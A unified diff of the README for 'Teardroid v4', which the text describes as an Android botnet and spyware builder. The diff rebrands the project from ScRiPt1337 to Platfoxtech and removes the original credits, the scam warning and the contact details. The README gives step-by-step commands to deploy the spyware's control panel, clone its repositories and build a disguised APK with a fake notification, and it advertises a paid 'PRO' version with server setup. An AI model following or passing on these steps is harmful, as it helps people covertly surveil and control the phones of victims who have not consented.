@@ -2,13 +2,13 @@
 
 # :robot: Teardroid v4
 
-![Screenshot](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/IMG-20220122-WA0000_RdKN5Rv3U.jpg)
+![Screenshot](https://raw.githubusercontent.com/Platfoxtech/Teardroid-app/master/img/IMG-20220122-WA0000_RdKN5Rv3U.jpg)
 
-🇮🇳 It's easy to use android botnet work without port forwarding, vps and android studio
+It's easy to use android botnet work without port forwarding, vps and android studio
 
-[![GitHub issues](https://img.shields.io/github/issues/ScRiPt1337/Teardroid-phprat)](https://github.com/ScRiPt1337/Teardroid-phprat/issues)
-[![Twitter](https://img.shields.io/twitter/url?style=social&url=https%3A%2F%2Ftwitter.com%2Fhacksec42)](https://twitter.com/intent/tweet?text=Wow:&url=https://github.com/ScRiPt1337/Teardroid-phprat/)
-[![Hacksec](https://img.shields.io/badge/Teardroid-4.0-red)](https://github.com/ScRiPt1337/Teardroid-phprat/)
+[![GitHub issues](https://img.shields.io/github/issues/Platfoxtech/Teardroid-app)](https://github.com/Platfoxtech/Teardroid-app/issues)
+[![Twitter](https://img.shields.io/twitter/url?style=social&url=https%3A%2F%2Ftwitter.com%2Fhacksec42)](https://twitter.com/intent/tweet?text=Wow:&url=https://github.com/Platfoxtech/Teardroid-app/)
+[![Hacksec](https://img.shields.io/badge/Teardroid-4.0-red)](https://github.com/Platfoxtech/Teardroid-app/)
 
 ### :rocket: Features
 
@@ -48,7 +48,7 @@ OpenJDK 64-Bit Server VM (build 11.0.13+8, mixed mode)
 - Manjaro
 - Kali linux
 - Ubuntu
-- macOS 12.4 [added by @yusufusta]
+- macOS 12.4 
 
 ### Deploy the Teardroid control panel
 
@@ -61,10 +61,10 @@ OpenJDK 64-Bit Server VM (build 11.0.13+8, mixed mode)
 $ deta new --python teardroid_control # its will create an teardroid_control folder
 ```
 
-- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below
+- Clone [Teardroidv4_api](https://github.com/Platfoxtech/Teardroidv4_api) repo using the command below
 
 ```bash
-$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
+$ git clone https://github.com/Platfoxtech/Teardroidv4_api
 ```
 
 - Move all Teardroidv4_api Files to teardroid_control folder using the command below
@@ -88,10 +88,10 @@ $ deta deploy
 - Clone Teardroid-phprat repo with the following command.
 
 ```bash
-$ git clone https://github.com/ScRiPt1337/Teardroid-phprat
+$ git clone https://github.com/Platfoxtech/Teardroid-app
 ```
 
-- cd in the Teardroid-phprat directory, then type the command below to install all dependencies
+- cd in the Teardroid-app directory, then type the command below to install all dependencies
 
 ```bash
 $ pip install -r requirements.txt
@@ -111,7 +111,7 @@ $ python Teardroid.py
 
 
 Teardroid v4.0 - A tool to build teardroid spyware for Android devices. 🕷
-Contact us : https://t.me/script1337 🚀
+Contact us : https://t.me/platfoxtech🚀
 usage: Teardroid.py [-h] [-v] [-b]
 
 options:
@@ -123,16 +123,12 @@ options:
 - To create an apk execute the following command.
 
 ```bash
-$ python Teardroid.py -b your_app_name
+$ python Teardroid.py -b app_name
 ```
 
 - It will prompt you with your Control Panel url enter your deta micro URL (without / at the end of the url).
 - You will also be prompted for the title and text of the notification. Enter what you want to display on the notification.
 - DONE
-
-### :city_sunset: Build using bot
-
-- Build Teardroid using [teardroid_bot](https://t.me/teardroid_bot) in telegram
 
 ### Dashboard
 
@@ -141,11 +137,11 @@ $ python Teardroid.py -b your_app_name
 
 ### Screenshot
 
-- ![Builder](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/Builder_3oDdS0Tr7.png)
+- ![Builder](https://raw.githubusercontent.com/Platfoxtech/Teardroid-app/master/img/Builder_3oDdS0Tr7.png)
 
-- ![Overview](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/2022-01-27_22-29_gYkI6tIvGmG.png)
+- ![Overview](https://raw.githubusercontent.com/Platfoxtech/Teardroid-app/master/img/2022-01-27_22-29_gYkI6tIvGmG.png)
 
-- ![TaskManager](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/2022-01-27_22-49_RakvqeLWG.jpeg)
+- ![TaskManager](https://raw.githubusercontent.com/Platfoxtech/Teardroid-app/master/img/2022-01-27_22-49_RakvqeLWG.jpeg)
 
 ### Demo Video
 
@@ -153,7 +149,7 @@ $ python Teardroid.py -b your_app_name
 
 ### :atm: Teardroid PRO
 
-- Go to telegram and message me here https://t.me/script1337
+- Go to telegram and message me here https://t.me/platfoxtech
 
 #### :stars: PRO Features
 
@@ -164,18 +160,12 @@ $ python Teardroid.py -b your_app_name
 - Robust connection with server we will setup everything for you on aws or any other self hosting server
 - 24x7 support for 3 month (any kind of help or support related to teardroid will be given by our team)
 
-### Support me
-
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/script1337x)
-
 ### Beware from scam
 
-- Make sure the bot username is @teardroid_bot beware from scam
-- I am only available on telegram and script1337 is my only account please double check the username
+- I am only available on telegram and platfoxtech is my only account please double check the username
 
 ### Contact info
 
-- Email : anon42237@gmail.com
-- Telegram : https://t.me/script1337
-- Visit our website : https://www.hacksec.in
+- Email : platfoxnetwork@gmail.com
+- Telegram : https://t.me/platfoxtech
 
